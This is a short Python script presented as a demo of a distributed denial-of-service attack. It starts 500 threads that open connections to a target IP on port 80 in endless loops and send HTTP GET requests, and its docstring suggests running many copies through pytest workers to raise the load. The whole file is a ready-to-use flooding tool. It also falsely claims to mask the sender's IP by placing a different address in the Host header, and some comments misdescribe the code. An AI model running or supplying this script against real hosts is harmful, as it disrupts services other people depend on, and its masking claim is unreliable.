'''
ddos_attack.py

    - This script is used to demo a distributed denial of service attack
    - Pytest along with several other copies of this script can be used to achieve a larger load
    > pytest -n 10            # 10 being the number of scripts/workers
'''

import socket
import threading

# IP address of the target
target = "192.168.1.1"
print(f"Target: {target}")

# port for python to use
port = 80
print(f"Port: {port}")

# mask ip of python
mask_ip = "10.10.10.2"
print(f"Mask: {mask_ip}")

# connected counter
connected = 0


def ddos():
    # recursive loop
    while True:
        # init server
        serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect server
        serv.connect((target, port))
        # send request
        serv.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"),
                    (target, port))
        serv.sendto(("Host: " + mask_ip + "\r\n\r\n").encode("ascii"),
                    (target, port))
        # close server
        serv.close()
        # use global
        global connected
        # rollback count
        connected += 1
        # log request
        print(f"DDOS Attempt: #{connected} -->> Target: {target}:{port}")


# run 500 times
for i in range(500):
    # start thread on ddos()
    thread = threading.Thread(target=ddos)
    thread.start()
